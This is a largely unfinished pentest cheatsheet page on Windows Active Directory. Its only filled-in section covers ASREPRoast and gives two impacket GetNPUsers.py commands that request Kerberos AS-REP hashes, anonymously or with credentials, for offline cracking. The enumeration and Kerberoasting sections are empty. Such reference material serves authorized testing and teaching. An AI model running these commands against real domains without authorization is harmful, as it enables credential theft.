---
layout: default
parent: Windows
grand_parent: Pentest Cheatsheets
title: Windows Active Directory
nav-order: 1
---

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

**Enumeration**
===============

**anonymous**
--------------


**Authenticated - Unpriv**
--------------------------


**Authenticated - Priv**
------------------------


**Attacks**
==============

**ASREPRoast**
--------------

Using **impacket** GetNPUsers.py with anonymous LDAP access. Output file is in default format which is JTR format

<details>
<summary><u>More Info</u></summary>
<p>
TARGET_DOMAIN - FQDN of target domain as structured domain.tld
<br>
DC_IP - IP of domain controller you want to run against
</p>
</details>

```
python3 GetNPUsers.py TARGET_DOMAIN/ -dc-ip DC_IP -request -outputfile TARGET_FILE.hash
```

Still **impacket** GetNPUsers.py with authenticated LDAP access. Output file is in is instead formatted for hashcat

```
python GetNPUsers.py TARGET_DOMAIN/USER_NAME:USER_PASS -request -format hashcat -outputfile TARGET_FILE.hash
```

**Kerberoasting**
--------------

```
```
